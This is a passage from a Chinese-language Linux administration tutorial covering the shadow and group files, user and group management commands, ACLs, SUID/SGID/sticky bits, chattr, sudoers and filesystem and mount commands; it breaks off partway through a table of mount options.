<h4 id="用户密码文件-影子文件"><a href="#用户密码文件-影子文件" class="headerlink" title="用户密码文件(影子文件)"></a>用户密码文件(影子文件)</h4><p>影子文件/etc/shadow(权限为000)(用冒号分隔),9个字段</p>
<ol>
<li>第1字段: 用户名称</li>
<li>第2字段: 加密密码<ul>
<li>加密算法升级为SHA512散列加密算法</li>
<li>如果密码位是”!!”或”*“代表没有密码,不能登录</li>
</ul>
</li>
<li><p>第3字段: 密码最后一次修改日期</p>
<ul>
<li>使用1970年1月1日作为标准时间,每过一天时间戳加1</li>
</ul>
</li>
<li>第4字段: 两次密码的修改间隔时间(和第3字段相比)(多少天后密码才能修改)</li>
<li>第5字段: 密码有效期(和第3字段相比)</li>
<li>第6字段: 密码修改到期前的警告天数(和第5字段相比)</li>
<li>第7字段: 密码过期后的宽限天数(和第5字段相比)(如果不改会禁止登陆)<ul>
<li>0: 代表密码过期后立即失效</li>
<li>-1: 代表密码永远不会失效</li>
</ul>
</li>
<li>第8字段: 账号失效时间<ul>
<li>要用时间戳表示</li>
</ul>
</li>
<li>第9字段: 保留</li>
</ol>
<h5 id="时间戳换算"><a href="#时间戳换算" class="headerlink" title="时间戳换算"></a>时间戳换算</h5><p>把时间戳换算为日期:</p>
<ul>
<li>date -d “1970-01-01 时间戳 days”</li>
</ul>
<p>把日期换算为时间戳:</p>
<ul>
<li>echo $(($(date —date=”日期” +%s)/86400+1))</li>
</ul>
<h4 id="组信息文件"><a href="#组信息文件" class="headerlink" title="组信息文件"></a>组信息文件</h4><p>组信息文件/etc/group,4个字段</p>
<ol>
<li>第1字段: 组名称</li>
<li>第2字段: 组密码标志(x)</li>
<li><p>第3字段: GID (初始组ID)</p>
</li>
<li><p>第4字段: 组中附加用户</p>
</li>
</ol>
<h4 id="组密码文件"><a href="#组密码文件" class="headerlink" title="组密码文件"></a>组密码文件</h4><p>组密码文件/etc/gshadow,4个字段</p>
<ol>
<li>第1字段: 组名称</li>
<li>第2字段: 组密码</li>
<li>第3字段: 组管理员用户名</li>
<li>第4字段: 组中附加用户</li>
</ol>
<h3 id="用户管理相关文件"><a href="#用户管理相关文件" class="headerlink" title="用户管理相关文件"></a>用户管理相关文件</h3><h4 id="用户家目录"><a href="#用户家目录" class="headerlink" title="用户家目录"></a>用户家目录</h4><ul>
<li>普通用户: /home/用户名/,所有者和所属组都是此用户,权限是700</li>
<li>超级用户: /root/, 所有者和所属组都是root用户,权限是550</li>
</ul>
<p>把普通用户变为超级用户可以修改UID,但家目录保持不变</p>
<h4 id="用户邮箱"><a href="#用户邮箱" class="headerlink" title="用户邮箱"></a>用户邮箱</h4><p>/var/spool/mail/用户名/</p>
<h4 id="用户模板目录"><a href="#用户模板目录" class="headerlink" title="用户模板目录"></a>用户模板目录</h4><p>/etc/skel/</p>
<p>创建新用户时,新用户家目录会包含这些模板</p>
<h3 id="用户管理命令-1"><a href="#用户管理命令-1" class="headerlink" title="用户管理命令"></a>用户管理命令</h3><h4 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h4><p>useradd [选项] 用户名</p>
<p>选项:<br>    -u UID               添加用户并指定用户的UID号<br>    -d 家目录          添加用户并指定用户的家目录<br>    -c 用户说明      添加用户并指定用户的说明<br>    -g 组名              添加用户并指定用户的初始组<br>    -G 组名             添加用户并指定用户的附加组(指定多个附加组用逗号分隔)<br>    -s shell              添加用户并指定用户的登录shell,默认是/bin/bash</p>
<h5 id="用户默认值文件"><a href="#用户默认值文件" class="headerlink" title="用户默认值文件"></a>用户默认值文件</h5><p>/etc/default/useradd</p>
<ul>
<li>GROUP=100            #用户默认组</li>
<li>HOME=/home        #用户家目录</li>
<li>INACTIVE=-1          #密码过期宽限天数(shadow文件第7字段)</li>
<li>EXPIRE=                   #密码失效时间(shadow文件第8字段)</li>
<li>SHELL=/bin/bash    #默认shell</li>
<li>SKEL=/etc/skel         #模板目录</li>
<li>CREATE_MAIL_SPOOL=yes    #是否建立邮箱</li>
</ul>
<p>/etc/login.defs</p>
<ul>
<li>PASS_MAX_DAYS 99999              #密码有效期(5)</li>
<li>PASS_MIN_DAYS 0                        #密码修改间隔(4)</li>
<li>PASS_MIN_LEN 5                          #密码最小5位(PAM)</li>
<li>PASS_WARN_AGE 7                      #密码到期警告(6)</li>
<li>UID_MIN        500                          #最小UID范围</li>
<li>GID_MAX      60000                       #最大UID范围</li>
<li>ENCRYPT_METHOD SHA512    #密码加密模式</li>
</ul>
<h4 id="修改用户密码"><a href="#修改用户密码" class="headerlink" title="修改用户密码"></a>修改用户密码</h4><p>passwd [选项] 用户名</p>
<p>选项:<br>    -S  查询用户密码的密码状态,仅root用户可用<br>    -l  暂时锁定用户,仅root用户可用(实际是在/etc/shadow中加密密码前添加!!)<br>    -u  解锁用户,仅root用户可用<br>    --stdin  可以通过管道符输出的数据作为用户的密码</p>
<p>root和普通用户可以使用passwd修改自己的密码,root也可以修改其他用户的密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;123&quot; | passwd --stdin user   &#x2F;&#x2F;将123作为用户user的密码</span><br></pre></td></tr></table></figure>
<h4 id="修改用户信息"><a href="#修改用户信息" class="headerlink" title="修改用户信息"></a>修改用户信息</h4><p>usermod [选项] 用户名</p>
<p>选项:<br>    -u UID               手工修改已存在用户的UID号<br>    -d 家目录          手工修改已存在用户的家目录<br>    -c 用户说明      手工修改已存在用户的说明<br>    -g 组名              手工修改已存在用户的初始组<br>    -G 组名             手工修改已存在用户的附加组(指定多个附加组用逗号分隔)<br>    -s shell              手工修改已存在用户的登录shell,默认是/bin/bash<br>    -L                       临时锁定已存在用户(Lock)<br>    -U                       解锁已存在用户锁定(Unlock)</p>
<p>usermod语法与useradd基本类似,usermod是修改已存在用户的信息,而useradd是添加一个新用户并修改相关信息(/etc/passwd)</p>
<h4 id="修改用户密码状态"><a href="#修改用户密码状态" class="headerlink" title="修改用户密码状态"></a>修改用户密码状态</h4><p>chage [选项] 用户名</p>
<p>选项:<br>    -l                   列出用户的详细密码状态<br>    -d 日期         修改密码最后一次更改日期(shadow3字段)<br>    -m 天数        两次密码修改间隔(4字段)<br>    -M 天数        密码有效期(5字段)<br>    -W 天数        密码过期前警告天数(6字段)<br>    -I 天数           密码过后宽限天数(7字段)<br>    -E 日期          账号失效时间(8字段)</p>
<p>(修改的是/etc/shadow)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chage -d 0 user   &#x2F;&#x2F;user登录后要求修改密码</span><br></pre></td></tr></table></figure>
<h4 id="删除用户"><a href="#删除用户" class="headerlink" title="删除用户"></a>删除用户</h4><p>userdel [-r] 用户名</p>
<p>选项:<br>    -r        删除用户的同时删除用户家目录</p>
<p>手工删除用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">手工删除用户user</span><br><span class="line">vi &#x2F;etc&#x2F;passwd    前4条命令是删除文件中与user相关的语句</span><br><span class="line">vi &#x2F;etc&#x2F;shadow</span><br><span class="line">vi &#x2F;etc&#x2F;group</span><br><span class="line">vi &#x2F;etc&#x2F;gshadow</span><br><span class="line">rm -rf &#x2F;var&#x2F;spool&#x2F;mail&#x2F;user</span><br><span class="line">rm -rf &#x2F;home&#x2F;user&#x2F;</span><br></pre></td></tr></table></figure>
<h4 id="切换用户"><a href="#切换用户" class="headerlink" title="切换用户"></a>切换用户</h4><p>su [选项] 用户名</p>
<p>选项:<br>    -                       选项只使用”-“代表连带用户的环境变量一起切换(这个不能省)<br>    -c 命令            仅执行一次命令,而不切换用户身份</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">su -root -c &quot;useradd user&quot;  &#x2F;&#x2F;不切换成root,但是借助root执行useradd命令添加user用户</span><br></pre></td></tr></table></figure>
<h4 id="查看用户ID"><a href="#查看用户ID" class="headerlink" title="查看用户ID"></a>查看用户ID</h4><p>id 用户名</p>
<p>uid(用户id),gid(初始组id),group(附加组id)</p>
<h3 id="用户组管理命令"><a href="#用户组管理命令" class="headerlink" title="用户组管理命令"></a>用户组管理命令</h3><h4 id="添加用户组"><a href="#添加用户组" class="headerlink" title="添加用户组"></a>添加用户组</h4><p>groupadd [选项] 组名</p>
<p>选项:<br>    -g GID        指定组id(不加默认从500依次往后排)</p>
<h4 id="修改用户组"><a href="#修改用户组" class="headerlink" title="修改用户组"></a>修改用户组</h4><p>groupmod  [选项] 组名</p>
<p>选项:<br>    -g GID                           修改已存在组的组id<br>    -n 新组名 老组名        修改组名</p>
<h4 id="删除用户组"><a href="#删除用户组" class="headerlink" title="删除用户组"></a>删除用户组</h4><p>groupdel 组名</p>
<p>组中有初始用户则不能删除(必须先删除初始用户再删除组),组中只有附加用户则可以删除</p>
<h4 id="把用户添加入组或从组中删除"><a href="#把用户添加入组或从组中删除" class="headerlink" title="把用户添加入组或从组中删除"></a>把用户添加入组或从组中删除</h4><p>gpasswd 选项 组名</p>
<p>选项:<br>    -a 用户名      把用户加入组(附加用户)<br>    -d 用户名      把用户从组中删除</p>
<h2 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h2><h3 id="ACL权限"><a href="#ACL权限" class="headerlink" title="ACL权限"></a>ACL权限</h3><p>任何文件只能有一个所属组;当所有者,所属组,其他人身份不够用时,要用到ACL权限给用户分配权限</p>
<h4 id="ACL权限简介与开启"><a href="#ACL权限简介与开启" class="headerlink" title="ACL权限简介与开启"></a>ACL权限简介与开启</h4><h5 id="查看分区是否支持ACL权限"><a href="#查看分区是否支持ACL权限" class="headerlink" title="查看分区是否支持ACL权限"></a>查看分区是否支持ACL权限</h5><p>默认都支持,保险起见查一下</p>
<p>dumpe2fs -h 分区</p>
<h1 id="dumpe2fs命令是查询指定分区详细文件系统信息的命令-使用df-h查看分区信息-查看Default-mount-options处是否支持ACL"><a href="#dumpe2fs命令是查询指定分区详细文件系统信息的命令-使用df-h查看分区信息-查看Default-mount-options处是否支持ACL" class="headerlink" title="dumpe2fs命令是查询指定分区详细文件系统信息的命令(使用df -h查看分区信息),查看Default mount options处是否支持ACL"></a>dumpe2fs命令是查询指定分区详细文件系统信息的命令(使用df -h查看分区信息),查看Default mount options处是否支持ACL</h1><p>选项:<br>    -h             仅显示超级块中信息,而不显示磁盘块组的详细信息</p>
<h5 id="临时开启分区ACL权限"><a href="#临时开启分区ACL权限" class="headerlink" title="临时开启分区ACL权限"></a>临时开启分区ACL权限</h5><p>mount -o remount,acl</p>
<h1 id="重新挂载根分区-并挂载加入acl权限-o表示支持特殊挂载选项-remount重新挂载"><a href="#重新挂载根分区-并挂载加入acl权限-o表示支持特殊挂载选项-remount重新挂载" class="headerlink" title="重新挂载根分区,并挂载加入acl权限(-o表示支持特殊挂载选项,remount重新挂载)"></a>重新挂载根分区,并挂载加入acl权限(-o表示支持特殊挂载选项,remount重新挂载)</h1><h5 id="永久开启分区ACL权限"><a href="#永久开启分区ACL权限" class="headerlink" title="永久开启分区ACL权限"></a>永久开启分区ACL权限</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;fstab    #(fstab是系统开机自动挂载文件,改这个文件要谨慎)在UUID的defaults后面添加&quot;,acl&quot;,保存并重启   </span><br><span class="line">#如果不重启,将根分区重新挂载</span><br><span class="line">mount -o remount &#x2F;      #将根分区重新挂载</span><br></pre></td></tr></table></figure>
<h4 id="查看与设定ACL权限"><a href="#查看与设定ACL权限" class="headerlink" title="查看与设定ACL权限"></a>查看与设定ACL权限</h4><h5 id="查看ACL权限"><a href="#查看ACL权限" class="headerlink" title="查看ACL权限"></a>查看ACL权限</h5><p>getfacl 文件名       #查看ACL权限(不支持绝对路径,但不影响执行)</p>
<h5 id="设定ACL权限"><a href="#设定ACL权限" class="headerlink" title="设定ACL权限"></a>设定ACL权限</h5><p>setfacl 选项 文件名</p>
<p>选项:<br>    -m          设定ACL权限<br>    -x            删除指定的ACL权限<br>    -b            删除所有的ACL权限<br>    -d            设定默认ACL权限<br>    -k            删除默认ACL权限<br>    -R           递归设定ACL权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setfacl -m u:用户名:权限 文件名或目录    #其中u代表用户,g代表组</span><br><span class="line">setfacl -m u:user:rx &#x2F;project&#x2F;</span><br></pre></td></tr></table></figure>
<p>用ll命令查看会多个加号</p>
<h4 id="最大有效权限与删除ACL权限"><a href="#最大有效权限与删除ACL权限" class="headerlink" title="最大有效权限与删除ACL权限"></a>最大有效权限与删除ACL权限</h4><h5 id="最大有效权限mask"><a href="#最大有效权限mask" class="headerlink" title="最大有效权限mask"></a>最大有效权限mask</h5><p>mask是用来指定最大有效权限的.如果给用户赋予了ACL权限,是需要和mask的权限“相与”才能得到用户的真正权限</p>
<p>以读权限(r)为例</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>a</th>
<th>b</th>
<th>and</th>
</tr>
</thead>
<tbody>
<tr>
<td>r</td>
<td>r</td>
<td>r</td>
</tr>
<tr>
<td>r</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>-</td>
<td>r</td>
<td>-</td>
</tr>
<tr>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
</tbody>
</table>
</div>
<h6 id="修改最大有效权限"><a href="#修改最大有效权限" class="headerlink" title="修改最大有效权限"></a>修改最大有效权限</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setfacl -m m:权限 文件名或目录  #m表示最大有效权限mask(修改后可能会多出#effective注释,代表实际权限)</span><br></pre></td></tr></table></figure>
<h5 id="删除ACL权限"><a href="#删除ACL权限" class="headerlink" title="删除ACL权限"></a>删除ACL权限</h5><p>方法一</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setfacl -x u:用户名 文件名或目录     #删除指定用户的ACL权限</span><br><span class="line">setfacl -x g:组名 文件名或目录      #删除指定用户组的ACL权限</span><br></pre></td></tr></table></figure>
<p>方法二</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setfacl -b 文件名或目录      #删除所有的ACL权限</span><br></pre></td></tr></table></figure>
<h4 id="默认ACL权限与递归ACL权限"><a href="#默认ACL权限与递归ACL权限" class="headerlink" title="默认ACL权限与递归ACL权限"></a>默认ACL权限与递归ACL权限</h4><h5 id="默认ACL权限"><a href="#默认ACL权限" class="headerlink" title="默认ACL权限"></a>默认ACL权限</h5><ul>
<li>默认ACL权限的作用是如果给父目录设定了默认ACL权限,那么父目录中所有新建的子文件都会继承父目录的ACL权限</li>
<li>setfacl -m d:u:用户名:权限 目录  (d表示设定默认ACL权限)</li>
</ul>
<h5 id="递归ACL权限"><a href="#递归ACL权限" class="headerlink" title="递归ACL权限"></a>递归ACL权限</h5><ul>
<li>递归是父目录在设定ACL权限时,所有的子文件和子目录也会拥有相同的ACL权限</li>
<li>setfacl -m u:用户名:权限 -R 目录  </li>
</ul>
<h3 id="文件特殊权限"><a href="#文件特殊权限" class="headerlink" title="文件特殊权限"></a>文件特殊权限</h3><h4 id="SetUID"><a href="#SetUID" class="headerlink" title="SetUID"></a>SetUID</h4><h5 id="SetUID的功能"><a href="#SetUID的功能" class="headerlink" title="SetUID的功能"></a>SetUID的功能</h5><ul>
<li>只有可以执行的二进制程序才能设定SUID权限(才有意义)</li>
<li>命令执行者要对该程序拥有x(执行)权限</li>
<li>命令执行者在执行该程序时获得该程序文件属主的身份(在执行程序的过程中灵魂附体为文件的属主)</li>
<li>SetUID权限只在该程序执行过程中有效,也就是说身份改变只在程序执行过程中有效</li>
<li>在所有者(u)范围拥有s权限(超级用户)</li>
<li>passwd命令拥有SetUID权限,所以普通可以修改自己的密码</li>
<li>cat命令没有SetUID权限,所以普通用户不能查看/etc/shadow文件内容</li>
</ul>
<h5 id="设定SetUID的方法"><a href="#设定SetUID的方法" class="headerlink" title="设定SetUID的方法"></a>设定SetUID的方法</h5><ol>
<li>chmod 4755 文件名     #4代表SUID,2代表SGID,1代表SBIT</li>
<li>chmod u+s 文件名     </li>
</ol>
<p>如果命令执行者对该程序没有x(执行)权限,设定后的s权限为S(大写),此时SUID不能生效</p>
<h5 id="取消SetUID的方法"><a href="#取消SetUID的方法" class="headerlink" title="取消SetUID的方法"></a>取消SetUID的方法</h5><ol>
<li>chmod 755 文件名</li>
<li>chmod u-s 文件名</li>
</ol>
<h5 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h5><ul>
<li>关键目录应严格控制写权限.比如”/“、”/usr”等</li>
<li>用户的密码设置要严格遵守密码三原则</li>
<li>对系统中默认应该具有SetUID权限的文件作一列表,定时检查有没有这之外的文件被设置了SetUID权限</li>
</ul>
<h4 id="SetGID"><a href="#SetGID" class="headerlink" title="SetGID"></a>SetGID</h4><p>在所属组(g)范围拥有s权限(locate具有SGID)</p>
<h5 id="SetGID针对文件的作用"><a href="#SetGID针对文件的作用" class="headerlink" title="SetGID针对文件的作用"></a>SetGID针对文件的作用</h5><ul>
<li>只有可执行的二进制程序才能设置SGID权限</li>
<li>命令执行者要对该程序拥有x(执行)权限</li>
<li>命令执行在执行程序的时候,组身份升级为该程序文件的属组</li>
<li>SetGID权限同样只在该程序执行过程中有效,也就是说组身份改变只在程序执行过程中有效</li>
</ul>
<h5 id="SetGID针对目录的作用"><a href="#SetGID针对目录的作用" class="headerlink" title="SetGID针对目录的作用"></a>SetGID针对目录的作用</h5><ul>
<li>普通用户必须对此目录拥有r和x权限,才能进入此目录</li>
<li>普通用户在此目录中的有效组会变成此目录的属组</li>
<li>若普通用户对此目录拥有w权限时,新建的文件的默认属组是这个目录的属组</li>
</ul>
<h5 id="设定SetGID"><a href="#设定SetGID" class="headerlink" title="设定SetGID"></a>设定SetGID</h5><ol>
<li>chmod 2755 文件名  (2代表SGID)</li>
<li>chmod g+s 文件名</li>
</ol>
<h5 id="取消SetGID的方法"><a href="#取消SetGID的方法" class="headerlink" title="取消SetGID的方法"></a>取消SetGID的方法</h5><ol>
<li>chmod 755 文件名</li>
<li>chmod g-s 文件名</li>
</ol>
<h4 id="Sticky-BIT"><a href="#Sticky-BIT" class="headerlink" title="Sticky BIT"></a>Sticky BIT</h4><p>在其他人范围拥有t权限(/tmp)</p>
<h5 id="SBIT粘着位作用"><a href="#SBIT粘着位作用" class="headerlink" title="SBIT粘着位作用"></a>SBIT粘着位作用</h5><ul>
<li>粘着位目前只对目录有效</li>
<li>普通用户对该目录拥有w和x权限,即普通用户可以在此目录拥有写入权限</li>
<li>如果没有粘着位,因为普通用户拥有w权限,所以可以删除此目录下所有文件,包括其他用户建立的文件.一但赋予了粘着位,除了root可以删除所有文件,普通用户就算拥有w权限,也只能删除自己建立的文件,但是不能删除其他用户建立的文件</li>
</ul>
<h5 id="设置粘着位"><a href="#设置粘着位" class="headerlink" title="设置粘着位"></a>设置粘着位</h5><ol>
<li>chmod 1755 目录名</li>
<li>chmod o+t 目录名</li>
</ol>
<h5 id="取消粘着位"><a href="#取消粘着位" class="headerlink" title="取消粘着位"></a>取消粘着位</h5><ol>
<li>chmod 755 目录名</li>
<li>chmod o-t 目录名</li>
</ol>
<h3 id="文件系统属性chattr权限"><a href="#文件系统属性chattr权限" class="headerlink" title="文件系统属性chattr权限"></a>文件系统属性chattr权限</h3><h4 id="chattr命令"><a href="#chattr命令" class="headerlink" title="chattr命令"></a>chattr命令</h4><p>chattr [+-=][选项] 文件或目录名   #对root用户也生效</p>
<ul>
<li>+        增加权限</li>
<li>-         删除权限</li>
<li>\=         赋予权限</li>
</ul>
<p>选项:</p>
<ul>
<li>i:如果对文件设置i属性,那么不允许对文件进行删除、改名,也不能添加和修改数据;如果对目录设置i属性,那么只能修改目录下文件的数据,但不允许建立和删除文件</li>
<li>a:如果对文件设置a属性,那么只能在文件中增加数据,但是不能删除也不能修改已有数据;如果对目录设置a属性,那么只允许在目录中建立和修改文件,但是不允许删除</li>
</ul>
<h4 id="查看文件系统属性"><a href="#查看文件系统属性" class="headerlink" title="查看文件系统属性"></a>查看文件系统属性</h4><p>lsattr 选项 文件名</p>
<p>选项:<br>    -a    显示所有文件和目录<br>    -d    若目标是目录,仅列出目录本身的属性,而不是子文件的</p>
<h3 id="系统命令sudo权限"><a href="#系统命令sudo权限" class="headerlink" title="系统命令sudo权限"></a>系统命令sudo权限</h3><h4 id="sudo权限"><a href="#sudo权限" class="headerlink" title="sudo权限"></a>sudo权限</h4><ul>
<li>root把本来只能超级用户执行的命令赋普通用户执行</li>
<li>sudo的操作对象是系统命令</li>
</ul>
<h4 id="sudo使用"><a href="#sudo使用" class="headerlink" title="sudo使用"></a>sudo使用</h4><h5 id="sudo赋予命令"><a href="#sudo赋予命令" class="headerlink" title="sudo赋予命令"></a>sudo赋予命令</h5><p>sudo的配置文档是/etc/sudoers ,我们能够用他的专用编辑工具visudo对其进行编辑 ,此工具的好处是在添加规则有误时,保存退出会提示给我们错误信息</p>
<p>[root@localhost ~ ]# visudo</p>
<h1 id="实际修改的是-etc-sudoers文件"><a href="#实际修改的是-etc-sudoers文件" class="headerlink" title="实际修改的是/etc/sudoers文件"></a>实际修改的是/etc/sudoers文件</h1><p>root    ALL=(ALL)   ALL </p>
<h1 id="用户名-被管理主机的地址-本机IP或ALL-可使用的身份-授权命令-绝对路径"><a href="#用户名-被管理主机的地址-本机IP或ALL-可使用的身份-授权命令-绝对路径" class="headerlink" title="用户名  被管理主机的地址(本机IP或ALL)=(可使用的身份)     授权命令    (绝对路径)"></a>用户名  被管理主机的地址(本机IP或ALL)=(可使用的身份)     授权命令    (绝对路径)</h1><h1 id="wheel-ALL-ALL-ALL"><a href="#wheel-ALL-ALL-ALL" class="headerlink" title="%wheel     ALL=(ALL)        ALL"></a>%wheel     ALL=(ALL)        ALL</h1><h1 id="组名-被管理主机的地址-可使用的身份-授权命令-绝对路径"><a href="#组名-被管理主机的地址-可使用的身份-授权命令-绝对路径" class="headerlink" title="%组名     被管理主机的地址= (可使用的身份)    授权命令   (绝对路径)"></a>%组名     被管理主机的地址= (可使用的身份)    授权命令   (绝对路径)</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost ~ ]#visudo      修改&#x2F;etc&#x2F;sudoers文件</span><br><span class="line">user ALL&#x3D;&#x2F;sbin&#x2F;shutdown -r now  授权user用户可以重启服务器</span><br></pre></td></tr></table></figure>
<h5 id="普通用户执行sudo赋予的命令"><a href="#普通用户执行sudo赋予的命令" class="headerlink" title="普通用户执行sudo赋予的命令"></a>普通用户执行sudo赋予的命令</h5><p>sudo -l         #查看可用的sudo命令</p>
<p>sudo /sbin/shutdown -r now         #sudo执行重启</p>
<h2 id="文件系统管理"><a href="#文件系统管理" class="headerlink" title="文件系统管理"></a>文件系统管理</h2><h3 id="分区与文件系统"><a href="#分区与文件系统" class="headerlink" title="分区与文件系统"></a>分区与文件系统</h3><h4 id="分区类型"><a href="#分区类型" class="headerlink" title="分区类型"></a>分区类型</h4><ul>
<li>主分区:总共最多只能分四个</li>
<li>扩展分区:只能有一个,也算作主分区的一种,也就是说主分区加扩展分区最多有四个.但是扩展分区不能存储数据和格式化,必须再划分成逻辑分区才能使用</li>
<li>逻辑分区:逻辑分区是在扩展分区中划分的,如果是IDE硬盘(hd),Linux最多持59个逻辑分区,如果是SCSI硬盘(sd)Linux最多支持11个逻辑分区</li>
</ul>
<h5 id="分区方法一"><a href="#分区方法一" class="headerlink" title="分区方法一"></a>分区方法一</h5><p><img src="https://i.loli.net/2021/02/02/3UKiabOH2JSjokI.png" alt=""></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>分区</th>
<th>设备文件名</th>
</tr>
</thead>
<tbody>
<tr>
<td>主分区1</td>
<td>/dev/sda1(a代表第一块硬盘)</td>
</tr>
<tr>
<td>主分区2</td>
<td>/dev/sda2</td>
</tr>
<tr>
<td>主分区3</td>
<td>/dev/sda3</td>
</tr>
<tr>
<td>拓展分区</td>
<td>/dev/sda4</td>
</tr>
<tr>
<td>逻辑分区1</td>
<td>/dev/sda5</td>
</tr>
<tr>
<td>逻辑分区2</td>
<td>/dev/sda6</td>
</tr>
<tr>
<td>逻辑分区3</td>
<td>/dev/sda7</td>
</tr>
</tbody>
</table>
</div>
<h5 id="分区方法二"><a href="#分区方法二" class="headerlink" title="分区方法二"></a>分区方法二</h5><p><img src="https://i.loli.net/2021/02/02/RMuzJQ6ODpsiecN.png" alt=""></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>分区</th>
<th>设备文件名</th>
</tr>
</thead>
<tbody>
<tr>
<td>主分区1</td>
<td>/dev/sda1</td>
</tr>
<tr>
<td>拓展分区</td>
<td>/dev/sda2</td>
</tr>
<tr>
<td>逻辑分区1</td>
<td>/dev/sda5</td>
</tr>
<tr>
<td>逻辑分区2</td>
<td>/dev/sda6</td>
</tr>
<tr>
<td>逻辑分区3</td>
<td>/dev/sda7</td>
</tr>
</tbody>
</table>
</div>
<h4 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h4><ul>
<li>ext2: 是ext文件系统的升级版本,Red Hat Linux7.2版本以前的系统默认都是ext2文件系统.最大支持16TB的分区和最大2TB的文件</li>
<li>ext3 : ext3文件系统是ext2文件系统的升级版本,最大的区别就是带日志功能,以便在系统突然停止时提高文件系统的可靠性.支持最大16TB的分区和最大2TB的文件</li>
<li>ext4: 它是ext3文件系统的升级版.ext4在性能、伸缩性和可靠性方面进行了大量改进.ext4的变化可以说是翻天覆地的,比如向下兼容ext3、最大1EB文件系统和16TB文件、无限数量子目录、Extents连续数据块概念、多块分配、延迟分配、持久预分配、快速FSCK、日志校验、无日志模式、在线碎片整理、inode增强、默认启用barrier等.是CentOS 6.3的默认文件系统.<br>(1EB=1024PB=1 024*1024TB )</li>
</ul>
<h3 id="文件系统常见命令"><a href="#文件系统常见命令" class="headerlink" title="文件系统常见命令"></a>文件系统常见命令</h3><h4 id="文件系统查看命令-df"><a href="#文件系统查看命令-df" class="headerlink" title="文件系统查看命令(df)"></a>文件系统查看命令(df)</h4><p>df [选项] [挂载点]</p>
<p>选项:<br>    -a    显示所有的文件系统信息,包括特殊文件系统,如/proc、/sysfs<br>    -h    使用习惯单位显示容量,如KB,MB或GB等<br>    -T    显示文件系统类型<br>    -m   以MB为单位显示容量<br>    -k    以KB为单位显示容量,默认就是以KB为单位</p>
<h4 id="统计目录或文件大小-du"><a href="#统计目录或文件大小-du" class="headerlink" title="统计目录或文件大小(du)"></a>统计目录或文件大小(du)</h4><p>du [选项] [目录或文件名]</p>
<p>选项:<br>    -a  显示每个子文件的磁盘占用量,默认只统计子目录的磁盘占用量<br>    -h  使用习惯单位显示磁盘占用量,如KB,MB或GB等<br>    -s   统计总占用量,而不列出子目录和子文件的占用量</p>
<p>统计文件大小一般用ls;统计目录大小用du命令,不要用ls命令</p>
<h4 id="df命令与du命令的区别"><a href="#df命令与du命令的区别" class="headerlink" title="df命令与du命令的区别"></a>df命令与du命令的区别</h4><ul>
<li>df命令是从文件系统考虑的,不光要考虑文件占用的空间,还要统计被命令或程序占用的空间(最常见的就是文件已经删除但是程序并没有释放空间)(df看到的一般比du大)(df更准确)</li>
<li>du命令是面向文件的,只会计算文件或目录占用的空间</li>
</ul>
<h4 id="文件系统修复命令-fsck"><a href="#文件系统修复命令-fsck" class="headerlink" title="文件系统修复命令(fsck)"></a>文件系统修复命令(fsck)</h4><p>fsck [选项] 分区设备文件名</p>
<p>选项:<br>    -a  不用显示用户提示,自动修复文件系统<br>    -y  自动修复,和-a作用一致,不过有些文件系统只支持-y</p>
<p>一般不需要手工执行</p>
<h4 id="显示磁盘状态命令-dump2fs"><a href="#显示磁盘状态命令-dump2fs" class="headerlink" title="显示磁盘状态命令(dump2fs)"></a>显示磁盘状态命令(dump2fs)</h4><p>dump2fs 分区设备名</p>
<p>可以查看硬盘的UUID</p>
<h4 id="挂载命令-mount"><a href="#挂载命令-mount" class="headerlink" title="挂载命令(mount)"></a>挂载命令(mount)</h4><h5 id="查询与自动挂载"><a href="#查询与自动挂载" class="headerlink" title="查询与自动挂载"></a>查询与自动挂载</h5><p>mount [-l]         #查询系统中已经挂载的设备,-l会显示卷标名称</p>
<p>mount -a          #依据配置文件/etc/fstab的内容,自动挂载</p>
<h5 id="挂载命令格式"><a href="#挂载命令格式" class="headerlink" title="挂载命令格式"></a>挂载命令格式</h5><p>mount [-t 文件系统] [-L 卷标名] [-o 特殊选项] 设备文件名 挂载点</p>
<p>选项:<br>    -t 文件系统   加入文件系统类型来指定挂载的类型,可以是ext3、ext4、iso9660等文件系统<br>    -L 卷标名       挂载指定卷标的分区,而不是安装设备文件名挂载<br>    -o 特殊选项   可以指定挂载的额外选项</p>
<p>特殊选项汇总:</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>atime/noatime</td>
<td>更新访问时间/不更新访问时间.访问分区文件时,是否更新文件的访问时间,默认为更新</td>
</tr>
<tr>
<td>async/sync</td>
<td>异步/同步,默认为异步</td>
</tr>
<tr>
<td>auto/noauto</td>
<td>自动/手动,mount -a命令执行时,是否会自动安装/etc/fstab文件内容挂载,默认为自动</td>
</tr>
<tr>
<td>defaults</td>
<td>定义默认值,相当于rw,suid,dev,exec,auto,nouser,async这七个选项</td>
</tr>
<tr>
<td>exec/noexec</td>
<td>执行/不执行,设定是否允许在文件系统中执行可执行文件,默认是exec允许(如果不允许,则里面文件无法执行)</td>
</tr>
<tr>
<td>remount</td>
<td>重新挂载已经挂载的文件系统,一般用于指定修改特殊权限</td>
</tr>
<tr>
<td>rw/ro</td>
<td>读写/只读,文件系统挂载时,是否具有读写权限,默认是rw</td>
</tr>
<tr>
<td>suid/nosuid</td>
